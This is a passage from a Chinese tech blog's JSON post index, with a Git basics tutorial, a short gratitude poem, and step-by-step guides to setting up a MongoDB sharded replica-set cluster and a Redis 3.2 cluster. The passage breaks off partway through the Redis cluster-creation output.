GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 快速入门：如何安装：Windows Git 安装包下载 Mac Git 安装包下载 Linux 安装教程 创建新仓库创建新的 git 仓库： 创建新文件夹 进入新文件夹 命令行执行”git init” 实例： 以上操作将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。点击链接获取更多关于.git文件夹中包含了文件的信息。 如果你是在一个非空文件夹中初始化，需要： 添加跟踪（git add） 提交（git commit） 实例： 获取Git仓库执行如下命令以创建一个本地仓库的克隆版本：1git clone https://github.com/netb2c/netb2c.github.io.git 如果是远端服务器上的仓库,可使用SSH传输协议:1git clone git@10.160.0.200:/data/sdk_svnserver/netb2c.git 检查当前文件状态要查看哪些文件处于什么状态，可以用 git status 命令1git status 以上反馈信息显示： 当前所在工作目录相当干净 所有已跟踪文件在上次提交后都未被更改过 当前目录下没有出现任何处于未跟踪状态的新文件 显示了当前所在分支(“master”) 添加、修改文件测试： 以上打印信息可以看到： daily_task.md 文件在Changes not staged for commit下面：– 文件内容发生便会– 未在暂存区需要保存到暂存区，需要执行”git add” 暂存修改 新建的 README.md 文件现在 Untracked files 下面：– 新文件未被跟踪– 新闻界需要添加跟踪 跟踪新文件使用命令 git add 开始跟踪一个文件：1git add 正常情况下不会打印信息。 再次查看状态： 两个文档都在Changes to be committed下:– 此时已暂时保存当前文档状态注：git add 只是将增加、修改后文件添加内容到下一次提交中”而不是“将文件直接添加到项目中” 简略状态信息查看git status 命令的输出十分详细，但其用语有些繁琐。如果你使用 git status -s 命令或 git status –short 命令，你将得到一种更为紧凑的格式输出，如图： A：新增 M：修改 ??：未被跟踪 查看已暂存和未暂存的修改git status 命令的输出对于你来说过于模糊，你想知道具体修改了什么地方，可以用 git diff 命令。 要查看尚未暂存的文件更新了哪些部分，不加参数直接输入 git diff 若要查看已暂存的将要添加到下次提交里的内容，需用 git diff –staged 提交更新暂存区域已经准备妥当可以提交了。一定要确认还有什么修改过的或新建的文件还没有 git add 过，否则提交的时候不会记录这些还没暂存起来的变化。 这些修改过的文件只保留在本地磁盘。 所以，每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit： 跳过使用暂存区域 Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤，详见下图： 删除文件要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 git rm 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。 正确的删除版本控制库文件需要： 删除本地文件： rm file 从版本控制库中删除： git rm file 提交更新： git commit -m “Commit message.” 移动文件Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。需要使用命令：1git mv old_name new_name 实例： 其实，运行 git mv 就相当于运行了下面三条命令：123mv README.md READMEgit rm README.mdgit add README","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"感恩","slug":"感恩","date":"2017-02-17T03:06:56.000Z","updated":"2017-02-17T06:09:43.707Z","comments":true,"path":"2017/02/17/感恩/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/感恩/","excerpt":"","text":"感恩123456789101112131415161718[感恩]是快乐的来源，感恩天地，生命之源感恩阳光，托起梦想感恩万物，助我成长感恩父母，赐予生命感恩兄弟，手足情深感恩某人，冤家聚首感恩孩子，舐犊情深感恩恩师，淳淳教诲感恩朋友，知心之谊感恩同袍，携手同行感恩领导，不吝提携感恩公司，给我平台感恩挫折，让我成长感恩命运，让我懂得感恩黑暗，让我领悟感恩科技，建立博客感恩，感恩，感恩....","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"感恩","slug":"感恩","permalink":"http://blog.unixmen.cn/tags/感恩/"}]},{"title":"第一篇博客","slug":"first","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T06:10:44.940Z","comments":true,"path":"2017/02/17/first/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/first/","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"开篇","slug":"开篇","permalink":"http://blog.unixmen.cn/tags/开篇/"}]},{"title":"MongoDB副本集分片集群配置","slug":"MongoDB+副本集分片集群配置","date":"2017-02-02T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/02/03/MongoDB+副本集分片集群配置/","link":"","permalink":"http://blog.unixmen.cn/2017/02/03/MongoDB+副本集分片集群配置/","excerpt":"1. 配置前准备工作准备MongoDB程序文件123456# wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel62-3.4.1.tgz# tar zxf mongodb-linux-x86_64-rhel62-3.4.1.tgz# cp -r mongodb-linux-x86_64-rhel62-3.4.1 /usr/local/# ln -s /usr/local/mongodb-linux-x86_64-rhel62-3.4.1 /usr/local/mongodb# ls /usr/local/mongodbbin  GNU-AGPL-3.0  MPL-2  README  THIRD-PARTY-NOTICES\n为MongoDB配置环境变量123# vim /etc/profile.d/mongodb.shexport PATH=/usr/local/mongodb/bin:$PATH# source /etc/profile.d/mongodb.sh","text":"1. 配置前准备工作准备MongoDB程序文件123456# wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel62-3.4.1.tgz# tar zxf mongodb-linux-x86_64-rhel62-3.4.1.tgz# cp -r mongodb-linux-x86_64-rhel62-3.4.1 /usr/local/# ln -s /usr/local/mongodb-linux-x86_64-rhel62-3.4.1 /usr/local/mongodb# ls /usr/local/mongodbbin GNU-AGPL-3.0 MPL-2 README THIRD-PARTY-NOTICES 为MongoDB配置环境变量123# vim /etc/profile.d/mongodb.shexport PATH=/usr/local/mongodb/bin:$PATH# source /etc/profile.d/mongodb.sh 为MongoDB创建相关目录1234567891011121314151617181920212223242526272829303132# mkdir -pv /home/mongodb/shard&#123;1,2,3&#125;/data/mkdir: created directory `/home/mongodb/shard1&apos;mkdir: created directory `/home/mongodb/shard1/data/&apos;mkdir: created directory `/home/mongodb/shard2&apos;mkdir: created directory `/home/mongodb/shard2/data/&apos;mkdir: created directory `/home/mongodb/shard3&apos;mkdir: created directory `/home/mongodb/shard3/data/&apos;# mkdir -pv /home/mongodb/shard&#123;1,2,3&#125;/config/mkdir: created directory `/home/mongodb/shard1/config/&apos;mkdir: created directory `/home/mongodb/shard2/config/&apos;mkdir: created directory `/home/mongodb/shard3/config/&apos;# mkdir -pv /home/mongodb/shard&#123;1,2,3&#125;/log/mkdir: created directory `/home/mongodb/shard1/log/&apos;mkdir: created directory `/home/mongodb/shard2/log/&apos;mkdir: created directory `/home/mongodb/shard3/log/&apos;# tree /home/mongodb/home/mongodb├── shard1│ ├── config│ ├── data│ └── log├── shard2│ ├── config│ ├── data│ └── log└── shard3 ├── config ├── data └── log12 directories, 0 files 2. 配置副本集启动MongoDB实例12345678910111213141516171819202122232425# mongod --shardsvr --replSet sharding1 --port 27101 --dbpath /home/mongodb/shard1/data/ --pidfilepath /home/mongodb/shard1/log/sharding1_1.pid --logpath /home/mongodb/shard1/log/sharding1_1.log --logappend --fork在生产环境中更推荐使用指定配置文件的方式来启动# cd /home/mongodb# vim shard1/config/shard1.confshardsvr = truereplSet = sharding1port = 27101quiet = truedbpath = /home/mongodb/shard1/data/pidfilepath = /home/mongodb/shard1/log/sharding1_1.pidlogpath = /home/mongodb/shard1/log/sharding1_1.logoplogSize = 2048directoryperdb=truelogappend = truerest = truefork = truejournal = truenoprealloc=true指定配置文件启动MongoDB# mongod --config /home/mongodb/shard1/config/shard1.conf添加iptables规则# iptables -I INPUT -s 192.168.1.0/24 -p tcp -j ACCEPT# service iptables save 初始化副本集（Replica Set）12345678910# mongo --port 27101&gt; use adminswitched to db admin&gt; db.runCommand(&#123;&quot;replSetInitiate&quot; :&#123;... &quot;_id&quot;:&quot;sharding1&quot;,... &quot;members&quot;:[... &#123;&quot;_id&quot;:1,&quot;host&quot;:&quot;10.1.1.148:27101&quot;&#125;,... &#123;&quot;_id&quot;:2,&quot;host&quot;:&quot;10.1.1.149:27101&quot;&#125;,... &#123;&quot;_id&quot;:3,&quot;host&quot;:&quot;10.1.1.150:27101&quot;&#125;,... ]&#125;&#125;) 验证副本集（Replica Sets）状态12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788sharding1:PRIMARY&gt; rs.status()&#123; &quot;set&quot; : &quot;sharding1&quot;, &quot;date&quot; : ISODate(&quot;2017-01-13T07:01:09.676Z&quot;), &quot;myState&quot; : 1, &quot;term&quot; : NumberLong(1), &quot;heartbeatIntervalMillis&quot; : NumberLong(2000), &quot;optimes&quot; : &#123; &quot;lastCommittedOpTime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;appliedOpTime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;durableOpTime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125; &#125;, &quot;members&quot; : [ &#123; &quot;_id&quot; : 1, &quot;name&quot; : &quot;10.1.1.148:27101&quot;, &quot;health&quot; : 1, &quot;state&quot; : 1, &quot;stateStr&quot; : &quot;PRIMARY&quot;, &quot;uptime&quot; : 1169, &quot;optime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;optimeDate&quot; : ISODate(&quot;2017-01-13T07:01:04Z&quot;), &quot;electionTime&quot; : Timestamp(1484290383, 1), &quot;electionDate&quot; : ISODate(&quot;2017-01-13T06:53:03Z&quot;), &quot;configVersion&quot; : 1, &quot;self&quot; : true &#125;, &#123; &quot;_id&quot; : 2, &quot;name&quot; : &quot;10.1.1.149:27101&quot;, &quot;health&quot; : 1, &quot;state&quot; : 2, &quot;stateStr&quot; : &quot;SECONDARY&quot;, &quot;uptime&quot; : 497, &quot;optime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;optimeDurable&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;optimeDate&quot; : ISODate(&quot;2017-01-13T07:01:04Z&quot;), &quot;optimeDurableDate&quot; : ISODate(&quot;2017-01-13T07:01:04Z&quot;), &quot;lastHeartbeat&quot; : ISODate(&quot;2017-01-13T07:01:09.543Z&quot;), &quot;lastHeartbeatRecv&quot; : ISODate(&quot;2017-01-13T07:01:09.460Z&quot;), &quot;pingMs&quot; : NumberLong(0), &quot;syncingTo&quot; : &quot;10.1.1.148:27101&quot;, &quot;configVersion&quot; : 1 &#125;, &#123; &quot;_id&quot; : 3, &quot;name&quot; : &quot;10.1.1.150:27101&quot;, &quot;health&quot; : 1, &quot;state&quot; : 2, &quot;stateStr&quot; : &quot;SECONDARY&quot;, &quot;uptime&quot; : 497, &quot;optime&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;optimeDurable&quot; : &#123; &quot;ts&quot; : Timestamp(1484290864, 1), &quot;t&quot; : NumberLong(1) &#125;, &quot;optimeDate&quot; : ISODate(&quot;2017-01-13T07:01:04Z&quot;), &quot;optimeDurableDate&quot; : ISODate(&quot;2017-01-13T07:01:04Z&quot;), &quot;lastHeartbeat&quot; : ISODate(&quot;2017-01-13T07:01:09.543Z&quot;), &quot;lastHeartbeatRecv&quot; : ISODate(&quot;2017-01-13T07:01:09.456Z&quot;), &quot;pingMs&quot; : NumberLong(0), &quot;syncingTo&quot; : &quot;10.1.1.148:27101&quot;, &quot;configVersion&quot; : 1 &#125; ], &quot;ok&quot; : 1&#125; 三台主机操作一致。其余两个副本集的设置同上。 3. 配置分片集群为config server创建相关目录1234567891011# mkdir -pv /home/mongodb/configsvr/&#123;data,config,log&#125;mkdir: created directory `/home/mongodb/configsvr&apos;mkdir: created directory `/home/mongodb/configsvr/data&apos;mkdir: created directory `/home/mongodb/configsvr/config&apos;mkdir: created directory `/home/mongodb/configsvr/log&apos;# tree /home/mongodb/home/mongodb├── configsvr│ ├── config│ ├── data│ └── log 启动config server实例12345678910111213# vim /home/mongodb/configsvr/config/configsvr.confconfigsvr = truereplSet = configdbdbpath = /home/mongodb/configsvr/data/port = 27301logpath = /home/mongodb/configsvr/log/dbconfig.logpidfilepath = /home/mongodb/configsvr/log/configdb.pidrest = truejournal = truelogappend = truefork = true# mongod --config /home/mongodb/configsvr/config/configsvr.conf 为config server 配置副本集123456789101112因为mongodb 3.2版本以后要求配置服务器必须也是副本集，所以我们要给config server也建立一个副本集# mongo --port 27301&gt; use adminswitched to db admin&gt; db.runCommand(&#123;&quot;replSetInitiate&quot; :&#123;... &quot;_id&quot;:&quot;configdb&quot;,... &quot;members&quot;:[... &#123;&quot;_id&quot;:1,&quot;host&quot;:&quot;10.1.1.148:27301&quot;&#125;,... &#123;&quot;_id&quot;:2,&quot;host&quot;:&quot;10.1.1.149:27301&quot;&#125;,... &#123;&quot;_id&quot;:3,&quot;host&quot;:&quot;10.1.1.150:27301&quot;&#125;,... ]&#125;&#125;)&#123; &quot;ok&quot; : 1 &#125; 为mongos创建相关目录1234567891011# mkdir -pv /home/mongodb/mongos/&#123;data,config,log&#125;mkdir: created directory `/home/mongodb/mongos&apos;mkdir: created directory `/home/mongodb/mongos/data&apos;mkdir: created directory `/home/mongodb/mongos/config&apos;mkdir: created directory `/home/mongodb/mongos/log&apos;# tree /home/mongodb/home/mongodb├── mongos│ ├── config│ ├── data│ └── log 启动mongos实例123456789# vim /home/mongodb/mongos/config/mongos.confconfigdb = configdb/10.1.1.148:27301,10.1.1.149:27301,10.1.1.150:27301port = 28885logpath = /home/mongodb/mongos/log/mongos.logpidfilepath = /home/mongodb/mongos/log/mongos.pidlogappend = truefork = true# mongos --config /home/mongodb/mongos/config/mongos.conf 登录mongos进程，配置Shard Cluster1234567# mongo --port 28885 adminmongos&gt; db.runCommand(&#123;addshard:&quot;sharding1/10.1.1.148:27101,10.1.1.149:27101,10.1.1.150:27101&quot;&#125;);&#123; &quot;shardAdded&quot; : &quot;sharding1&quot;, &quot;ok&quot; : 1 &#125;mongos&gt; db.runCommand(&#123;addshard:&quot;sharding2/10.1.1.148:27102,10.1.1.149:27102,10.1.1.150:27102&quot;&#125;);&#123; &quot;shardAdded&quot; : &quot;sharding2&quot;, &quot;ok&quot; : 1 &#125;mongos&gt; db.runCommand(&#123;addshard:&quot;sharding3/10.1.1.148:27103,10.1.1.149:27103,10.1.1.150:27103&quot;&#125;);&#123; &quot;shardAdded&quot; : &quot;sharding3&quot;, &quot;ok&quot; : 1 &#125;","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"MongoDB","slug":"Linux/MongoDB","permalink":"http://blog.unixmen.cn/categories/Linux/MongoDB/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://blog.unixmen.cn/tags/MongoDB/"},{"name":"副本集","slug":"副本集","permalink":"http://blog.unixmen.cn/tags/副本集/"},{"name":"分片集群","slug":"分片集群","permalink":"http://blog.unixmen.cn/tags/分片集群/"}]},{"title":"Redis Cluster部署配置","slug":"Redis-Cluster+部署配置","date":"2017-02-01T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/02/02/Redis-Cluster+部署配置/","link":"","permalink":"http://blog.unixmen.cn/2017/02/02/Redis-Cluster+部署配置/","excerpt":"1. 配置前准备工作部署规划1234567891011集群使用三台服务器，每服务器上分别部署两个实例（端口监听6379、7379），一共6个实例来组建集群。redis安装路径/usr/local/redis3链接至/usr/local/redisredis数据存放位置/home/redis/&#123;6379,7379&#125;/dataredis日志文件、pid文件位置/home/redis/&#123;6379,7379&#125;/logredis配置文件位置/home/redis/&#123;6379,7379&#125;/config\n准备redis安装程序12# wget http://download.redis.io/releases/redis-3.2.6.tar.gz# tar zxf redis-3.2.6.tar.gz","text":"1. 配置前准备工作部署规划1234567891011集群使用三台服务器，每服务器上分别部署两个实例（端口监听6379、7379），一共6个实例来组建集群。redis安装路径/usr/local/redis3链接至/usr/local/redisredis数据存放位置/home/redis/&#123;6379,7379&#125;/dataredis日志文件、pid文件位置/home/redis/&#123;6379,7379&#125;/logredis配置文件位置/home/redis/&#123;6379,7379&#125;/config 准备redis安装程序12# wget http://download.redis.io/releases/redis-3.2.6.tar.gz# tar zxf redis-3.2.6.tar.gz 为redis创建相关目录1234567891011121314redis安装目录# mkdir -pv /usr/local/redis3redis数据目录redis日志文件、PID文件、配置文件目录# mkdir -pv /home/redis/&#123;6379,7379&#125;/&#123;data,config,log&#125;mkdir: created directory `/home/redis&apos;mkdir: created directory `/home/redis/6379&apos;mkdir: created directory `/home/redis/6379/data&apos;mkdir: created directory `/home/redis/6379/config&apos;mkdir: created directory `/home/redis/6379/log&apos;mkdir: created directory `/home/redis/7379&apos;mkdir: created directory `/home/redis/7379/data&apos;mkdir: created directory `/home/redis/7379/config&apos;mkdir: created directory `/home/redis/7379/log&apos; 配置相应iptables规则12# iptables -I INPUT -s 10.1.1.0/24 -p tcp -j ACCEPT# service iptables save 2. 安装redis并配置实例安装redis12345678910111213141516171819202122232425解决依赖关系# yum install -y gcc*# cd redis-3.2.6# make# make testcd src &amp;&amp; make testmake[1]: Entering directory `/home/soft/redis/redis-3.2.6/src&apos;You need tcl 8.5 or newer in order to run the Redis testmake[1]: *** [test] Error 1make[1]: Leaving directory `/home/soft/redis/redis-3.2.6/src&apos;make: *** [test] Error 2报错，提示需要tcl 8.5或以上版本支持。# yum install -y tcl继续make test，通过。如果继续报错：*** [err]: Test replication partial resync: ok psync (diskless: yes, reconnect: 1) in tests/integration/replication-psync.tcl只需要以单核运行make test就行了# taskset -c 1 sudo make test指定目录安装# make PREFIX=/usr/local/redis3 install# ln -s /usr/local/redis3 /usr/local/redis# ls /usr/local/redisbin 配置环境变量123# vim /etc/profile.d/redis.shexport PATH=/usr/local/redis/bin:$PATH# source /etc/profile.d/redis.sh 准备redis配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# vim /home/redis/6379/config/redis-6379.confbind 10.1.1.148protected-mode noport 6379tcp-backlog 511timeout 0tcp-keepalive 0daemonize yessupervised nopidfile /home/redis/6379/log/redis_6379.pidloglevel noticelogfile &quot;/home/redis/6379/log/redis-6379.log&quot;databases 16save 900 1save 300 10save 60 10000stop-writes-on-bgsave-error yesrdbcompression yesrdbchecksum yesdbfilename dump.rdbdir /home/redis/6379/data/slave-serve-stale-data yesslave-read-only yesrepl-diskless-sync norepl-diskless-sync-delay 5repl-disable-tcp-nodelay noslave-priority 100maxclients 10000appendonly yesappendfilename &quot;appendonly.aof&quot;appendfsync everysecno-appendfsync-on-rewrite noauto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mbaof-load-truncated yeslua-time-limit 5000cluster-enabled yes #（开启集群）cluster-config-file /home/redis/6379/config/nodes-6379.conf #（此配置文件在首次启动时自动生成）cluster-node-timeout 15000cluster-slave-validity-factor 10cluster-migration-barrier 1cluster-require-full-coverage yesslowlog-log-slower-than 10000slowlog-max-len 128latency-monitor-threshold 0notify-keyspace-events &quot;&quot;hash-max-ziplist-entries 512hash-max-ziplist-value 64list-max-ziplist-size -2list-compress-depth 0set-max-intset-entries 512zset-max-ziplist-entries 128zset-max-ziplist-value 64hll-sparse-max-bytes 3000activerehashing yesclient-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60hz 10aof-rewrite-incremental-fsync yes# cp /home/redis/6379/config/redis-6379.conf /home/redis/7379/config/redis-7379.conf将6379的配置文件复制到7379中，并修改相应的路径及端口号。# sed -i &apos;s/6379/7379/g&apos; /home/redis/7379/config/redis-7379.conf在其余几台服务器上同样操作，记住务必要修改相应端口号及绑定IP。 启动redis实例12# redis-server /home/redis/6379/config/redis-6379.conf# redis-server /home/redis/7379/config/redis-7379.conf 3. 创建redis-cluster集群使用redis-trib.rb来创建cluster集群1234redis官方提供了一个工具/home/soft/redis/redis-3.2.6/src/redis-trib.rb用来创建集群。# /home/soft/redis/redis-3.2.6/src/redis-trib.rb create --replicas 1 10.1.1.148:6379 10.1.1.149:6379 10.1.1.150:6379 10.1.1.148:7379 10.1.1.149:7379 10.1.1.150:7379/usr/bin/env: ruby: No such file or directory有报错，因为这是一个ruby程序，必须安装ruby才可以执行 安装ruby及相关支持1234# yum -y install ruby ruby-devel rubygems rpm-build# gem install redis此处可指定安装对应版本，如# gem install redis --version 3.2.2 创建redis-cluster集群123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138# /home/soft/redis/redis-3.2.6/src/redis-trib.rb create --replicas 1 10.1.1.148:6379 10.1.1.149:6379 10.1.1.150:6379 10.1.1.148:7379 10.1.1.149:7379 10.1.1.150:7379&gt;&gt;&gt; Creating cluster&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Using 3 masters:10.1.1.150:637910.1.1.149:637910.1.1.148:6379Adding replica 10.1.1.149:7379 to 10.1.1.150:6379Adding replica 10.1.1.150:7379 to 10.1.1.149:6379Adding replica 10.1.1.148:7379 to 10.1.1.148:6379M: 4b37935462a37c9817f9c90877b07a8984c8c5d4 10.1.1.148:6379 slots:10923-16383 (5461 slots) masterM: a96f7c1a1b9fa6c128549cbef80e7b021c8c2e57 10.1.1.149:6379 slots:5461-10922 (5462 slots) masterM: cffe855dfc88781443af94d65a8b25b6bbf381fd 10.1.1.150:6379 slots:0-5460 (5461 slots) masterS: 96ac7786eb3317048f82be33024c954794a75230 10.1.1.148:7379 replicates 4b37935462a37c9817f9c90877b07a8984c8c5d4S: 03bd2483ab51191208bfdbc6781e8910018980f1 10.1.1.149:7379 replicates cffe855dfc88781443af94d65a8b25b6bbf381fdS: 0ba60ec12c581896898fe0504009cdb494f61bc6 10.1.1.150:7379 replicates a96f7c1a1b9fa6c128549cbef80e7b021c8c2e57Can I set the above configuration? (type &apos;yes&apos; to accept): yes/usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:111:in `_write_to_socket&apos;: Connection timed out (Redis::TimeoutError) from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:131:in `write&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:130:in `loop&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:130:in `write&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:374:in `write&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:271:in `write&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:250:in `io&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:269:in `write&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:228:in `process&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:222:in `each&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:222:in `process&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:367:in `ensure_connected&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:221:in `process&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:306:in `logging&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:220:in `process&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/client.rb:120:in `call&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis.rb:2705:in `method_missing&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis.rb:58:in `synchronize&apos; from /usr/lib/ruby/1.8/monitor.rb:242:in `mon_synchronize&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis.rb:58:in `synchronize&apos; from /usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis.rb:2704:in `method_missing&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:212:in `flush_node_config&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:776:in `flush_nodes_config&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:775:in `each&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:775:in `flush_nodes_config&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:1296:in `create_cluster_cmd&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:1701:in `send&apos; from /home/soft/redis/redis-3.2.6/src/redis-trib.rb:1701 出现报错：/usr/lib/ruby/gems/1.8/gems/redis-3.3.2/lib/redis/connection/ruby.rb:111:in `_write_to_socket&apos;: Connection timed out (Redis::TimeoutError)搜索了一下，发现是gem安装的redis库版本太高。# gem list*** LOCAL GEMS ***redis (3.3.2)卸载并使用3.0的gem就OK了。# gem uninstall redis --version 3.3.2Successfully uninstalled redis-3.3.2# gem install redis --version 3.0.0Successfully installed redis-3.0.01 gem installedInstalling ri documentation for redis-3.0.0...Installing RDoc documentation for redis-3.0.0...# gem list*** LOCAL GEMS ***redis (3.0.0)重新执行命令创建集群继续报错：/usr/lib/ruby/gems/1.8/gems/redis-3.0.0/lib/redis/client.rb:79:in `call&apos;: ERR Slot 11291 is already busy (Redis::CommandError)这是因为之前创建集群没有成功,需要将nodes.conf和dir里面的文件全部删除# rm -rf 6379/config/nodes-6379.conf# rm -rf 6379/data/*# rm -rf 7379/config/nodes-7379.conf# rm -rf 7379/data/*# redis-cli -p 6379 shutdown# redis-cli -p 7379 shutdown# redis-server /home/redis/6379/config/redis-6379.conf# redis-server /home/redis/7379/config/redis-7379.conf报错：一直卡在Waiting for the cluster to join.....................................问题原因不明，但是按照网上的解决办法是，在redis配置文件中bind一行只绑定一个内网IP地址即可，不要绑定本地回环地址127.0.0.1# vim /home/redis/6379/config/redis-6379.confbind 10.1.1.148创建集群成功# /home/soft/redis/redis-3.2.6/src/redis-trib.rb create --replicas 1 10.1.1.148:6379 10.1.1.149:6379 10.1.1.150:6379 10.1.1.148:7379 10.1.1.149:7379 10.1.1.150:7379&gt;&gt;&gt; Creating cluster&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Using 3 masters:10.1.1.149:637910.1.1.148:637910.1.1.150:6379Adding replica 10.1.1.148:7379 to 10.1.1.149:6379Adding replica 10.1.1.149:7379 to 10.1.1.148:6379Adding replica 10.1.1.150:7379 to 10.1.1.150:6379M: ce3a2498a81f450b3d648bc1ede7c82fcac87cf2 10.1.1.148:6379 slots:5461-10922 (5462 slots) masterM: 74719e18073c6ac08da0a5608e7986d057e51ee4 10.1.1.149:6379 slots:0-5460 (5461 slots) masterM: 3c2b327b2b56ddf07fc4040061f95dd6458b5154 10.1.1.150:6379 slots:10923-16383 (5461 slots) masterS: 0d43b62b9ce2241147376574280e339b1fc3a97b 10.1.1.148:7379 replicates 74719e18073c6ac08da0a5608e7986d057e51ee4S: 40a7736a56fe9671a79eb4e392a3669a4797c4d3 10.1.1.149:7379 replicates ce3a2498a81f450b3d648bc1ede7c82fcac87cf2S: b6e2e6c8093bfa92d49c6f3771316ca1c5304c01 10.1.1.150:7379 replicates 3c2b327b2b56ddf07fc4040061f95dd6458b5154Can I set the above configuration? (type &apos;yes&apos; to accept): yes&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join..&gt;&gt;&gt; Performing Cluster Check (using node 10.1.1.148:6379)M: ce3a2498a81f450b3d648bc1ede7c82fcac87cf2 10.1.1.148:6379 slots:5461-10922 (5462 slots) master 1 additional replica(s)S: 40a7736a56fe9671a79eb4e392a3669a4797c4d3 10.1.1.149:7379 slots: (0 slots) slave replicates ce3a2498a81f450b3d648bc1ede7c82fcac87cf2S: b6e2e6c8093bfa92d49c6f3771316ca1c5304c01 10.1.1.150:7379 slots: (0 slots) slave replicates 3c2b327b2b56ddf07fc4040061f95dd6458b5154M: 74719e18073c6ac08da0a5608e7986d057e51ee4 10.1.1.149:6379 slots:0-5460 (5461 slots) master 1 